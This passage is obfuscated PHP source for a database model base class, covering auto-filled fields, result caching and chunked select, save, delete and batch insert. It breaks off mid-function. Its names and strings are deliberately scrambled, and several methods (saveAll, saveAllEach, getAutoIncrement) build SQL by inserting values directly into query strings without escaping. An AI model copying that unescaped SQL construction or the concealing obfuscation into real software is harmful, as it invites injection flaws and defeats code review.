<?php
 goto Eßã©ÂÂ„; EÙÙîâÑî: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\146\171\124\x69\155\145", "\x74\151\155\x65", "\151\156\x73\145\162\164\x2c\x75\x70\x64\141\x74\x65", "\x66\x75\x6e\143\164\151\157\156"), array("\143\x72\x65\141\x74\x65\x54\151\x6d\145", "\x74\151\155\145", "\151\x6e\x73\x65\162\164", "\146\x75\156\143\x74\x69\157\156")); public function setDataAuto($eÑ…å¥»Ê²) { $this->dataAuto = $eÑ…å¥»Ê²; } public function __construct($AªÇÃ™éã = '', $CšóÛÜƒï¨ = '', $cÁ›À é‹ = '') { parent::__construct($AªÇÃ™éã, $CšóÛÜƒï¨, $cÁ›À é‹); } public static function textEncode($b®ĞËÒ¿¯) { if (!$b®ĞËÒ¿¯) { return $b®ĞËÒ¿¯; } $bÁÜ¤£ÃÀÏ = json_encode($b®ĞËÒ¿¯); $bÁÜ¤£ÃÀÏ = preg_replace_callback($_SERVER[ì‹É][338], function ($F¨ ¯Ï´³) { return addslashes($F¨ ¯Ï´³[0]); }, $bÁÜ¤£ÃÀÏ); return json_decode($bÁÜ¤£ÃÀÏ); } public static function textDecode($cÏÂøŒƒØİ) { $bÃĞµŸ†Œ¬ =& $_SERVER[ì‹É]; $c±‹®ª´“ö = json_encode($cÏÂøŒƒØİ); $c±‹®ª´“ö = preg_replace_callback($bÃĞµŸ†Œ¬[339], function ($Dù­ß‰¡Óˆ) { return $_SERVER[ì‹É][96]; }, $c±‹®ª´“ö); return json_decode($c±‹®ª´“ö); } protected $tableMeta = array(); protected function _beforeInsert(&$B«ïÀºˆÕ, $FªçëÖ¡©) { $f°„Ñµğè =& $_SERVER[ì‹É]; if (!$this->checkDataAutoHas($f°„Ñµğè[340])) { return; } $this->dataBeforeFilter($B«ïÀºˆÕ, $f°„Ñµğè[340]); } protected function _beforeUpdate(&$a™ µéÂ©ù, $A¨™éÚ£…ß) { $b®œ–‡‰¼ =& $_SERVER[ì‹É]; if (!$this->checkDataAutoHas($b®œ–‡‰¼[341])) { return; } $this->dataBeforeFilter($a™ µéÂ©ù, $b®œ–‡‰¼[341]); } protected function _afterSelect(&$fÃÔ¡è•§, $Fğ˜°Í¾á) { if (!is_array($fÃÔ¡è•§)) { return; } if (!$this->checkDataAutoHas($_SERVER[ì‹É][342])) { return; } foreach ($fÃÔ¡è•§ as &$a÷£¤ª«¤ô) { $this->dataAfterFilter($a÷£¤ª«¤ô); } } protected function _afterFind(&$dÄª¸ ¿, $bìã‚îš¦—) { if (!is_array($dÄª¸ ¿)) { return; } if (!$this->checkDataAutoHas($_SERVER[ì‹É][342])) { return; } $this->dataAfterFilter($dÄª¸ ¿); } public function setAutoIncrement($a©«ÚŠåô²) { $F¶£¶¦»Ÿ‡ = array($this->getPk() => $a©«ÚŠåô²); $e†¥Š¯®‚ = $this->data($F¶£¶¦»Ÿ‡)->add(); if ($e†¥Š¯®‚) { $this->delete($e†¥Š¯®‚); } } public function getAutoIncrement() { $EÄ‹µŒÓ¬Ó = $this->getTableName(); $A“ÃÏ‚Ü¹ä = $this->max($this->getPk()); $D‰×ÁÕ‚¶¼ = $this->query("\x73\x68\157\167\x20\164\141\x62\154\x65\40\163\x74\x61\x74\165\163\40\167\150\x65\x72\x65\x20\116\x61\155\145\75\47{$EÄ‹µŒÓ¬Ó}\x27"); $A¶ô£Ğéº = $D‰×ÁÕ‚¶¼[0][$_SERVER[ì‹É][343]]; $f—¬…¿Éè° = max($A“ÃÏ‚Ü¹ä, $A¶ô£Ğéº); return $f—¬…¿Éè°; } protected function _callBefore($aË’ÀÉ˜ÁŒ, $b—ŞÔà¢­º) { return $this->cacheCallCheck($aË’ÀÉ˜ÁŒ, $b—ŞÔà¢­º, !1); } protected function _callAfter($e×£–õì, $F–±ÃÑ”­œ) { return $this->cacheCallCheck($e×£–õì, $F–±ÃÑ”­œ, !0); } protected function cacheFunctionAlias($CïÈÖÅ†°—) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($dÅßØ ƒˆğ, $fâÇÀÏ¨á, $c­Ô›Æ ±§ = false) { $eÂô‚šœì£ = $this->cacheFunctionAlias($fâÇÀÏ¨á); if (!$eÂô‚šœì£) { return; } foreach ($eÂô‚šœì£ as $A™š®ëôô => $Eİ‘™×†÷Û) { $aÂŒ½¤›öæ = $Eİ‘™×†÷Û[0]; $AµÔÔ¹”˜ø = explode($_SERVER[ì‹É][47], $Eİ‘™×†÷Û[1]); if ($dÅßØ ƒˆğ == $A™š®ëôô) { return $this->cacheFunctionGet($A™š®ëôô, $aÂŒ½¤›öæ); } if ($c­Ô›Æ ±§ && in_array($dÅßØ ƒˆğ, $AµÔÔ¹”˜ø)) { $this->cacheFunctionClear($A™š®ëôô, $aÂŒ½¤›öæ); } } } public function cacheFunctionGet($Cª¤àš®ƒÔ, $FøŒ¼ÀÂŠ) { $DƒŠ·‡Õ¦ = $this->cacheKeyMake($Cª¤àš®ƒÔ, $FøŒ¼ÀÂŠ); $b©‰ÃÆîòØ = Cache::get($DƒŠ·‡Õ¦); if (!is_array($b©‰ÃÆîòØ)) { $b©‰ÃÆîòØ = call_user_func_array(array($this, $Cª¤àš®ƒÔ), array($FøŒ¼ÀÂŠ, !0)); Cache::set($DƒŠ·‡Õ¦, $b©‰ÃÆîòØ); } return $b©‰ÃÆîòØ; } public function cacheFunctionClear($dÉÉŠ¡¤, $B†®ôø¨Ñ) { $f¤»ºàéº = $B†®ôø¨Ñ; if (!is_array($B†®ôø¨Ñ)) { $f¤»ºàéº = array($B†®ôø¨Ñ); } foreach ($f¤»ºàéº as $fäª­ËÀÔÁ) { $Báà¨æóê” = $this->cacheKeyMake($dÉÉŠ¡¤, $fäª­ËÀÔÁ); Cache::remove($Báà¨æóê”); } } private function cacheKeyMake($Aù­Â÷ÜÕ, $fÄøğ–Õ²) { $f¢¾ŸÜÖ™Ş =& $_SERVER[ì‹É]; return get_class($this) . $f¢¾ŸÜÖ™Ş[71] . $Aù­Â÷ÜÕ . $f¢¾ŸÜÖ™Ş[344] . $fÄøğ–Õ²; } protected function selectPage($cÒÔÏ›¹³ = 200, $E´ó–³«Íİ = 1) { goto CÎ ´‘†ù­; fˆºÑ£ä£”: $CõÓ–‡ãó = intval($this->count()); $cÒÔÏ›¹³ = intval($cÒÔÏ›¹³); $cÒÔÏ›¹³ = $cÒÔÏ›¹³ <= 5 ? 5 : ($cÒÔÏ›¹³ >= $eÍè­ƒ‘ó ? $eÍè­ƒ‘ó : $cÒÔÏ›¹³); goto f˜ÑÜÈä; aÌ” †ª‚è: $this->optionsValue($FÊˆ¸ÓÌİ²); $B²‘ÓÈãÉ£ = $this->page($E´ó–³«Íİ, $cÒÔÏ›¹³)->select(); if ($CÑåã—”±¬ == 1) { $CõÓ–‡ãó = count($B²‘ÓÈãÉ£); } goto bÁ»ó½™÷¤; bÁ»ó½™÷¤: $FòÕ•‹¹Ä• = array($eî¢óÒá×[347] => array($eî¢óÒá×[348] => $CõÓ–‡ãó, $eî¢óÒá×[345] => $cÒÔÏ›¹³, $eî¢óÒá×[336] => $E´ó–³«Íİ, $eî¢óÒá×[349] => $CÑåã—”±¬), $eî¢óÒá×[350] => $B²‘ÓÈãÉ£ ? $B²‘ÓÈãÉ£ : array()); return $FòÕ•‹¹Ä•; goto CÍ­ÜÛŠÄ½; CÎ ´‘†ù­: $eî¢óÒá× =& $_SERVER[ì‹É]; global $in; $FÊˆ¸ÓÌİ² = $this->optionsValue(); goto e°í‚¿íòÖ; e°í‚¿íòÖ: $eÍè­ƒ‘ó = 4000; $cÒÔÏ›¹³ = isset($in[$eî¢óÒá×[345]]) ? $in[$eî¢óÒá×[345]] : $cÒÔÏ›¹³; if ($cÒÔÏ›¹³ === -1) { unset($in[$eî¢óÒá×[345]]); $eÍè­ƒ‘ó = 100000000; $cÒÔÏ›¹³ = $eÍè­ƒ‘ó; } goto A‹…õÃË‚º; A‹…õÃË‚º: $f£÷©Ò¶ğ› = $FÊˆ¸ÓÌİ²; $f£÷©Ò¶ğ›[$eî¢óÒá×[346]] = array(); $this->optionsValue($f£÷©Ò¶ğ›); goto fˆºÑ£ä£”; f˜ÑÜÈä: $CÑåã—”±¬ = ceil($CõÓ–‡ãó / $cÒÔÏ›¹³); $E´ó–³«Íİ = intval(isset($in[$eî¢óÒá×[336]]) ? $in[$eî¢óÒá×[336]] : $E´ó–³«Íİ); $E´ó–³«Íİ = $E´ó–³«Íİ <= 1 ? 1 : ($E´ó–³«Íİ >= $CÑåã—”±¬ ? $CÑåã—”±¬ : $E´ó–³«Íİ); goto aÌ” †ª‚è; CÍ­ÜÛŠÄ½: } protected function checkLength($aÔç¹¢îØâ, $fÕÏ„Ç É = 0, $cÅÓº•é¿ƒ = '') { $fœµîà¦¢ =& $_SERVER[ì‹É]; $fÕÏ„Ç É = $fÕÏ„Ç É ? $fÕÏ„Ç É : 65536; if (!$aÔç¹¢îØâ || strlen($aÔç¹¢îØâ) < $fÕÏ„Ç É) { return; } $cÅÓº•é¿ƒ = $cÅÓº•é¿ƒ ? $cÅÓº•é¿ƒ . $fœµîà¦¢[68] : $fœµîà¦¢[33]; show_json($cÅÓº•é¿ƒ . LNG($fœµîà¦¢[351]) . "\50{$fÕÏ„Ç É}\51", !1); } protected function metaSet($Bâá¥ÂŒ¾, $fø Òõ£à„ = null, $b¡‚­¤Ö÷ = null) { goto a£çÊ­òÅŸ; C·ò”êƒ£ì: if (is_null($fø Òõ£à„)) { return $B¦Šóœ»öë->where(array($d†›ò•¼¿† => $Bâá¥ÂŒ¾))->delete(); } if (is_null($b¡‚­¤Ö÷)) { return $B¦Šóœ»öë->where($fó ³ë¦š„)->delete(); } $this->checkLength($b¡‚­¤Ö÷, !1, $this->tableMeta[$C‰¹È½„˜í[353]] . $C‰¹È½„˜í[4] . $fø Òõ£à„); goto bğ„Şè¤¬Ş; a£çÊ­òÅŸ: $C‰¹È½„˜í =& $_SERVER[ì‹É]; if (!$this->tableMeta) { return !1; } $d†›ò•¼¿† = $this->tableMeta[$C‰¹È½„˜í[352]]; goto F÷Ù§İ„ÜÙ; F÷Ù§İ„ÜÙ: $B¦Šóœ»öë = Model($this->tableMeta[$C‰¹È½„˜í[353]]); if (is_array($fø Òõ£à„)) { $a”¦¶ñŸ©ˆ = array(); foreach ($fø Òõ£à„ as $e±õ÷ËÉ´Ã => $dŠ»àÖ›ä) { $this->checkLength($dŠ»àÖ›ä, !1, $this->tableMeta[$C‰¹È½„˜í[353]] . $C‰¹È½„˜í[4] . $e±õ÷ËÉ´Ã); $a”¦¶ñŸ©ˆ[] = array($d†›ò•¼¿† => $Bâá¥ÂŒ¾, $C‰¹È½„˜í[90] => $e±õ÷ËÉ´Ã, $C‰¹È½„˜í[354] => $dŠ»àÖ›ä); } $B¦Šóœ»öë->where(array($d†›ò•¼¿† => $Bâá¥ÂŒ¾))->addAll($a”¦¶ñŸ©ˆ, array(), !0); return !0; } $fó ³ë¦š„ = array($d†›ò•¼¿† => $Bâá¥ÂŒ¾, $C‰¹È½„˜í[355] => $fø Òõ£à„); goto C·ò”êƒ£ì; bğ„Şè¤¬Ş: $E‰ÂŸÉÄ• = !1; if ($B¦Šóœ»öë->where($fó ³ë¦š„)->find()) { $E‰ÂŸÉÄ• = $B¦Šóœ»öë->where($fó ³ë¦š„)->save(array($C‰¹È½„˜í[356] => $b¡‚­¤Ö÷)); } else { $fó ³ë¦š„[$C‰¹È½„˜í[354]] = $b¡‚­¤Ö÷; $E‰ÂŸÉÄ• = $B¦Šóœ»öë->add($fó ³ë¦š„); } return $E‰ÂŸÉÄ•; goto Aù””Ô‡É«; Aù””Ô‡É«: } public function metaGet($CéùÀâ ŸÁ) { goto E›æç‹Úš; F˜ŞãĞÃÎ: $EÕ‡«É¹¶ê = array_to_keyvalue($EÕ‡«É¹¶ê, $E æŒé’¥[90], $E æŒé’¥[354]); return $EÕ‡«É¹¶ê; goto D­¯çÅÖâ; E›æç‹Úš: $E æŒé’¥ =& $_SERVER[ì‹É]; if (!$this->tableMeta) { return array(); } $dßƒ˜æÔ«Œ = $this->tableMeta[$E æŒé’¥[352]]; goto a…šœ´¥Ó; a…šœ´¥Ó: $CÈ£¬Ÿ—‰Œ = Model($this->tableMeta[$E æŒé’¥[353]]); $eÀÎïˆƒ¤İ = array($dßƒ˜æÔ«Œ => $CéùÀâ ŸÁ); $EÕ‡«É¹¶ê = $CÈ£¬Ÿ—‰Œ->field($E æŒé’¥[357])->where($eÀÎïˆƒ¤İ)->select(); goto F˜ŞãĞÃÎ; D­¯çÅÖâ: } private function checkDataAutoHas($BêÖïÏïÕ˜) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $e—ÚÄÃ¾îà) { if (in_array($BêÖïÏïÕ˜, explode($_SERVER[ì‹É][47], $e—ÚÄÃ¾îà[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$D·¯‹®‚¢’, $Aê–Æ»˜š) { $E—§àğÂİ… =& $_SERVER[ì‹É]; foreach ($this->dataAuto as $A¦×’ÉÆˆ) { $cä¡•‘è¨£ = $A¦×’ÉÆˆ[0]; if (!in_array($Aê–Æ»˜š, explode($E—§àğÂİ…[47], $A¦×’ÉÆˆ[2]))) { continue; } switch (trim($A¦×’ÉÆˆ[3])) { case $E—§àğÂİ…[306]: case $E—§àğÂİ…[307]: $E¿œÎ”Ø† = $A¦×’ÉÆˆ[1]; $Cœ´ôëÇÃŒ = isset($A¦×’ÉÆˆ[4]) ? (array) $A¦×’ÉÆˆ[4] : array(); if ($E¿œÎ”Ø† == $E—§àğÂİ…[187] && array_key_exists($cä¡•‘è¨£, $D·¯‹®‚¢’)) { if (!$D·¯‹®‚¢’[$cä¡•‘è¨£]) { unset($D·¯‹®‚¢’[$cä¡•‘è¨£]); } break; } if (isset($D·¯‹®‚¢’[$cä¡•‘è¨£])) { array_unshift($Cœ´ôëÇÃŒ, $D·¯‹®‚¢’[$cä¡•‘è¨£]); } if ($E—§àğÂİ…[306] == $A¦×’ÉÆˆ[3]) { $D·¯‹®‚¢’[$cä¡•‘è¨£] = call_user_func_array($E¿œÎ”Ø†, $Cœ´ôëÇÃŒ); } else { $D·¯‹®‚¢’[$cä¡•‘è¨£] = call_user_func_array(array(&$this, $E¿œÎ”Ø†), $Cœ´ôëÇÃŒ); } break; case $E—§àğÂİ…[258]: $D·¯‹®‚¢’[$cä¡•‘è¨£] = $D·¯‹®‚¢’[$A¦×’ÉÆˆ[1]]; break; case $E—§àğÂİ…[279]: if (isset($D·¯‹®‚¢’[$cä¡•‘è¨£]) && !is_string($D·¯‹®‚¢’[$cä¡•‘è¨£])) { $D·¯‹®‚¢’[$cä¡•‘è¨£] = json_encode_force($D·¯‹®‚¢’[$cä¡•‘è¨£]); } break; case $E—§àğÂİ…[308]: if ($D·¯‹®‚¢’[$cä¡•‘è¨£] === $E—§àğÂİ…[33]) { unset($D·¯‹®‚¢’[$cä¡•‘è¨£]); } break; case $E—§àğÂİ…[309]: $D·¯‹®‚¢’[$cä¡•‘è¨£] = $A¦×’ÉÆˆ[1]; default: break; } } if ($Aê–Æ»˜š == $E—§àğÂİ…[340]) { $A¢£Û´Ä¸ = strtolower($this->db->getDbType()); if (strpos($A¢£Û´Ä¸, $E—§àğÂİ…[9]) !== 0) { return; } $fë¹ñóİˆ‚ = $this->field(!0)->fields; $cµÂáŠ– = $fë¹ñóİˆ‚[$E—§àğÂİ…[237]]; if (isset($fë¹ñóİˆ‚[$E—§àğÂİ…[236]])) { unset($cµÂáŠ–[$fë¹ñóİˆ‚[$E—§àğÂİ…[236]]]); } foreach ($cµÂáŠ– as $dÀÑÈ¨Úâî => $Aê–Æ»˜š) { if (!isset($D·¯‹®‚¢’[$dÀÑÈ¨Úâî])) { $D·¯‹®‚¢’[$dÀÑÈ¨Úâî] = $E—§àğÂİ…[33]; } } } } private function dataAfterFilter(&$C»¦Æğì) { $eÓ¹¦…Ú“¶ =& $_SERVER[ì‹É]; foreach ($this->dataAuto as $eŒÑéÛ÷©²) { $eµòÍÌÎ¦ = $eŒÑéÛ÷©²[0]; if (!in_array($eÓ¹¦…Ú“¶[342], explode($eÓ¹¦…Ú“¶[47], $eŒÑéÛ÷©²[2]))) { continue; } if (!isset($C»¦Æğì[$eµòÍÌÎ¦])) { continue; } switch (trim($eŒÑéÛ÷©²[3])) { case $eÓ¹¦…Ú“¶[306]: case $eÓ¹¦…Ú“¶[307]: $dºòò÷ïİÀ = isset($eŒÑéÛ÷©²[4]) ? (array) $eŒÑéÛ÷©²[4] : array(); array_unshift($dºòò÷ïİÀ, $C»¦Æğì[$eµòÍÌÎ¦]); if ($eÓ¹¦…Ú“¶[306] == $eŒÑéÛ÷©²[3]) { $C»¦Æğì[$eµòÍÌÎ¦] = call_user_func_array($eŒÑéÛ÷©²[1], $dºòò÷ïİÀ); } else { $C»¦Æğì[$eµòÍÌÎ¦] = call_user_func_array(array(&$this, $eŒÑéÛ÷©²[1]), $dºòò÷ïİÀ); } break; case $eÓ¹¦…Ú“¶[258]: $C»¦Æğì[$eµòÍÌÎ¦] = $C»¦Æğì[$eŒÑéÛ÷©²[1]]; break; case $eÓ¹¦…Ú“¶[279]: $FÅ“ ·Ø”ë = $C»¦Æğì[$eµòÍÌÎ¦]; $C»¦Æğì[$eµòÍÌÎ¦] = json_decode($FÅ“ ·Ø”ë, !0); if (is_null($C»¦Æğì[$eµòÍÌÎ¦])) { $C»¦Æğì[$eµòÍÌÎ¦] = $FÅ“ ·Ø”ë; } break; case $eÓ¹¦…Ú“¶[308]: if ($C»¦Æğì[$eµòÍÌÎ¦] === $eÓ¹¦…Ú“¶[33]) { unset($C»¦Æğì[$eµòÍÌÎ¦]); } break; case $eÓ¹¦…Ú“¶[309]: $C»¦Æğì[$eµòÍÌÎ¦] = $eŒÑéÛ÷©²[1]; default: break; } } } public function saveAll($f§‡¿ç) { goto D‡Œ£³³‹á; Dô¿Øã‰¦à: $fâ÷Ê®è = $FÓˆ®æ…Íï[358]; $C¸¢Ú¬ª‰„ = 0; $DÅ¸ô«“¡Ì = array(); goto CÑŠÉ´Åí; D‡Œ£³³‹á: $FÓˆ®æ…Íï =& $_SERVER[ì‹É]; $f»§¾¶ğØØ = $this->tablePrefix . $this->tableName; $AŠÇÇÄ–ôí = self::SQL_WHERE_IN_CHUNK; goto Dô¿Øã‰¦à; CÑŠÉ´Åí: $C¢ƒ†”—õÒ = count($f§‡¿ç); for ($A’óÉ‰Ä = 0; $A’óÉ‰Ä < $C¢ƒ†”—õÒ; $A’óÉ‰Ä++) { $d˜Å…ª•áÈ = $f§‡¿ç[$A’óÉ‰Ä]; if (!is_array($d˜Å…ª•áÈ) || count($d˜Å…ª•áÈ) != 4) { continue; } $Añ¸óŒÛ¢Î = "\125\x50\x44\101\124\105\x20{$f»§¾¶ğØØ}\x20\123\105\124\40{$d˜Å…ª•áÈ[2]}\40\75\x20\103\x41\123\x45\40{$d˜Å…ª•áÈ[0]}\x20\xa"; if ($C¸¢Ú¬ª‰„ == 0) { $fâ÷Ê®è = $Añ¸óŒÛ¢Î; } $DÅ¸ô«“¡Ì[] = $FÓˆ®æ…Íï[114] . $d˜Å…ª•áÈ[1] . $FÓˆ®æ…Íï[114]; $C¸¢Ú¬ª‰„++; $fâ÷Ê®è .= "\x20\x57\110\105\116\40\x27{$d˜Å…ª•áÈ[1]}\47\x20\x54\110\x45\116\x20\47{$d˜Å…ª•áÈ[3]}\47\40\12"; if ($C¸¢Ú¬ª‰„ == $AŠÇÇÄ–ôí || $A’óÉ‰Ä == $C¢ƒ†”—õÒ - 1) { goto B÷´ÍÚô©; BĞ—îÉÜâ´: $C¸¢Ú¬ª‰„ = 0; $fâ÷Ê®è = $Añ¸óŒÛ¢Î; $this->chunkEventCheck(count($DÅ¸ô«“¡Ì)); goto BºÛâÙèÃÔ; BºÛâÙèÃÔ: $DÅ¸ô«“¡Ì = array(); goto eªìİÛ„î˜; B÷´ÍÚô©: $E©ñè§æ = implode($FÓˆ®æ…Íï[47], $DÅ¸ô«“¡Ì); $fâ÷Ê®è .= "\40\x45\x4e\x44\40\40\127\x48\105\x52\105\40{$d˜Å…ª•áÈ[0]}\x20\111\116\40\50{$E©ñè§æ}\x29\x20"; $this->execute($fâ÷Ê®è); goto BĞ—îÉÜâ´; eªìİÛ„î˜: } } $this->chunkEventSet(); goto bÀ©¾«°ù; bÀ©¾«°ù: } public function saveAllEach($Bïê…é¹¹’) { $Eêæ¬¦ÕÉ =& $_SERVER[ì‹É]; $e§ó­§‚Â§ = $this->tablePrefix . $this->tableName; foreach ($Bïê…é¹¹’ as $eø°¼¥ºí) { if (!is_array($eø°¼¥ºí) || count($eø°¼¥ºí) != 4) { continue; } $bïŸØ¤Ú = $eø°¼¥ºí[0] . $Eêæ¬¦ÕÉ[359] . $eø°¼¥ºí[1] . $Eêæ¬¦ÕÉ[114]; $cÀ±–– § = $eø°¼¥ºí[2] . $Eêæ¬¦ÕÉ[359] . $eø°¼¥ºí[3] . $Eêæ¬¦ÕÉ[114]; $FÁ¹ÇÁÖù’ = "\x75\x70\x64\141\x74\145\x20{$e§ó­§‚Â§}\x20\x73\x65\x74\40{$cÀ±–– §}\40\167\x68\x65\x72\145\x20{$bïŸØ¤Ú}\73"; $this->execute($FÁ¹ÇÁÖù’); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Bª³ÔÑˆò = false, $cåÌ×”Çïï = false) { $this->_chunkEvent = $Bª³ÔÑˆò; $this->_chunkEventParam = $cåÌ×”Çïï; } private function chunkEventCheck($b–Åì‰Ç²¬) { if (!$this->_chunkEvent) { return; } $bÑÄ„ìĞ¶ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $bÑÄ„ìĞ¶[$_SERVER[ì‹É][360]] = $b–Åì‰Ç²¬; Hook::trigger($this->_chunkEvent, $bÑÄ„ìĞ¶); } public function addAll($e„Ø÷›ÅÈÍ, $aš„ñµäö¶ = array(), $BÇ¨Ìö¹° = false) { goto fÅòè©¥ôÕ; B‰ºîÅåƒÈ: if (method_exists($this->db, $C¾ÅˆØ¹®´[257])) { for ($a®Í¡´›Øæ = 0; $a®Í¡´›Øæ < count($e„Ø÷›ÅÈÍ); $a®Í¡´›Øæ += $CĞ±±Œ°†ø) { $aîíÉğËö = array_slice($e„Ø÷›ÅÈÍ, $a®Í¡´›Øæ, $CĞ±±Œ°†ø); if (!is_array($aîíÉğËö) || count($aîíÉğËö) == 0) { break; } $Fº®Ù®·¢µ = $this->db->insertAll($aîíÉğËö, $aš„ñµäö¶, $BÇ¨Ìö¹°); $this->chunkEventCheck(count($aîíÉğËö)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($e„Ø÷›ÅÈÍ as $E²¡«·“è => $b¦óî»î‹Â) { $Fº®Ù®·¢µ = $this->db->insert($b¦óî»î‹Â, $aš„ñµäö¶, $BÇ¨Ìö¹°); } $this->commit(); } if (!1 !== $Fº®Ù®·¢µ) { $c…“·¦«Áï = $this->getLastInsID(); if ($c…“·¦«Áï) { return $c…“·¦«Áï; } } return $Fº®Ù®·¢µ; goto D “—ÅŠÑ; fÅòè©¥ôÕ: $C¾ÅˆØ¹®´ =& $_SERVER[ì‹É]; ignore_timeout(); $CĞ±±Œ°†ø = self::SQL_WHERE_IN_CHUNK; goto E”–Î˜êªŒ; E”–Î˜êªŒ: if (empty($e„Ø÷›ÅÈÍ)) { $this->error = think_lang($C¾ÅˆØ¹®´[256]); return !1; } $aš„ñµäö¶ = $this->_parseOptions($aš„ñµäö¶); foreach ($e„Ø÷›ÅÈÍ as $E²¡«·“è => $b¦óî»î‹Â) { $e„Ø÷›ÅÈÍ[$E²¡«·“è] = $this->_facade($b¦óî»î‹Â); $this->_beforeInsert($e„Ø÷›ÅÈÍ[$E²¡«·“è], $aš„ñµäö¶); } goto B‰ºîÅåƒÈ; D “—ÅŠÑ: } public function save($F—à—Â¾ùì = '', $c„‰Œ•‚å¶ = array()) { goto fˆç‚§™•Ó; b÷¹áĞ”×: $this->chunkEventSet(); return $Aî“Ùƒó‰‡; goto BÀöÑ¸Ş‹Ø; Cƒ¢³íí¤Ë: $FÒ…‘Ä¶óË = $A…ëôé°µÌ[$DšôÔ²²ÀÀ[260]][$dŸ®ƒª†Ëƒ][1]; $C¬›ÎùšÄ = count($FÒ…‘Ä¶óË); for ($aÚƒÎ£ŒÖ = 0; $aÚƒÎ£ŒÖ < $C¬›ÎùšÄ; $aÚƒÎ£ŒÖ += $C°ìòĞù‰) { $d¦¶ºÒÙƒ™ = array_slice($FÒ…‘Ä¶óË, $aÚƒÎ£ŒÖ, $C°ìòĞù‰); if (!is_array($d¦¶ºÒÙƒ™) || count($d¦¶ºÒÙƒ™) == 0) { break; } $A…ëôé°µÌ[$DšôÔ²²ÀÀ[260]][$dŸ®ƒª†Ëƒ][1] = $d¦¶ºÒÙƒ™; $this->optionsValue($A…ëôé°µÌ); $Aî“Ùƒó‰‡ += parent::save($F—à—Â¾ùì, $c„‰Œ•‚å¶); $this->chunkEventCheck(count($d¦¶ºÒÙƒ™)); } goto b÷¹áĞ”×; fˆç‚§™•Ó: $DšôÔ²²ÀÀ =& $_SERVER[ì‹É]; $C°ìòĞù‰ = self::SQL_WHERE_IN_CHUNK; $A…ëôé°µÌ = $this->optionsValue(); goto C‹ì¨ŠÚù»; C‹ì¨ŠÚù»: $dŸ®ƒª†Ëƒ = $this->findWhereField($A…ëôé°µÌ); if (!$dŸ®ƒª†Ëƒ) { return parent::save($F—à—Â¾ùì, $c„‰Œ•‚å¶); } $Aî“Ùƒó‰‡ = 0; goto Cƒ¢³íí¤Ë; BÀöÑ¸Ş‹Ø: } public function add($D§œí’©´Ë = '', $dÍ‡ŠÈ¸£­ = array(), $A…øÇğÕšğ = false) { if ($this->addTaskStatus && is_array($D§œí’©´Ë)) { $this->addTaskData[] = $D§œí’©´Ë; return; } return parent::add($D§œí’©´Ë, $dÍ‡ŠÈ¸£­, $A…øÇğÕšğ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($d†¶ÓÂç»Ï = array()) { goto AŒóåšİ¿Ñ; c…¬ÓÃ“´Ş: $B‡ã—Ø­îæ = $this->findWhereField($Aî¸²íé»Í); if (!$B‡ã—Ø­îæ || isset($Aî¸²íé»Í[$EÙßÌ‘‘[277]]) || isset($Aî¸²íé»Í[$EÙßÌ‘‘[336]])) { return parent::select($d†¶ÓÂç»Ï); } $DÎŠ³­Ş×Ì = $Aî¸²íé»Í[$EÙßÌ‘‘[260]][$B‡ã—Ø­îæ][1]; goto EÚ’³©àÅ; AŒóåšİ¿Ñ: $EÙßÌ‘‘ =& $_SERVER[ì‹É]; $A™ô¤ñóğ = self::SQL_WHERE_IN_CHUNK; $Aî¸²íé»Í = $this->optionsValue(); goto c…¬ÓÃ“´Ş; EÚ’³©àÅ: $b¬¸´˜²‡ = null; for ($cñ÷‰ÔµÍ = 0; $cñ÷‰ÔµÍ < count($DÎŠ³­Ş×Ì); $cñ÷‰ÔµÍ += $A™ô¤ñóğ) { $b÷Éó‰²„• = array_slice($DÎŠ³­Ş×Ì, $cñ÷‰ÔµÍ, $A™ô¤ñóğ); if (!is_array($b÷Éó‰²„•) || count($b÷Éó‰²„•) == 0) { break; } $Aî¸²íé»Í[$EÙßÌ‘‘[260]][$B‡ã—Ø­îæ][1] = $b÷Éó‰²„•; $this->optionsValue($Aî¸²íé»Í); $e·¶Œ™…Â = parent::select($d†¶ÓÂç»Ï); if (!$e·¶Œ™…Â) { continue; } if (is_null($b¬¸´˜²‡)) { $b¬¸´˜²‡ = array(); } $b¬¸´˜²‡ = array_merge($b¬¸´˜²‡, $e·¶Œ™…Â); } return $b¬¸´˜²‡; goto b–¤¥âæ´; b–¤¥âæ´: } public function delete($EéãŒ¸™Ü« = array()) { goto B–å—–¦; a´ÇÈğŞìœ: $C¨Ÿğè‹¼Ü = $this->findWhereField($AİÌˆ•«Üå); if (!$C¨Ÿğè‹¼Ü) { return parent::delete($EéãŒ¸™Ü«); } $C×ØåÖÂâ = 0; goto Dõ¶¿‘Ö›; B–å—–¦: $eÔõ¶¸ĞœÖ =& $_SERVER[ì‹É]; $cÏ‹ˆ†´â– = self::SQL_WHERE_IN_CHUNK; $AİÌˆ•«Üå = $this->optionsValue(); goto a´ÇÈğŞìœ; Dõ¶¿‘Ö›: $EëˆÓĞ½Ş = $AİÌˆ•«Üå[$eÔõ¶¸ĞœÖ[260]][$C¨Ÿğè‹¼Ü][1]; for ($cƒÏ¹ÇòÑ² = 0; $cƒÏ¹ÇòÑ² < count($EëˆÓĞ½Ş); $cƒÏ¹ÇòÑ² += $cÏ‹ˆ†´â–) { $c„ÅÆÍ„ÏÓ = array_slice($EëˆÓĞ½Ş, $cƒÏ¹ÇòÑ², $cÏ‹ˆ†´â–); if (!is_array($c„ÅÆÍ„ÏÓ) || count($c„ÅÆÍ„ÏÓ) == 0) { break; } $AİÌˆ•«Üå[$eÔõ¶¸ĞœÖ[260]][$C¨Ÿğè‹¼Ü][1] = $c„ÅÆÍ„ÏÓ; $this->optionsValue($AİÌˆ•«Üå); $C×ØåÖÂâ += parent::delete($EéãŒ¸™Ü«); } return $C×ØåÖÂâ; goto Dœˆºßí’ƒ; Dœˆºßí’ƒ: } private function findWhereField($aˆĞÔ—Ê‘) { 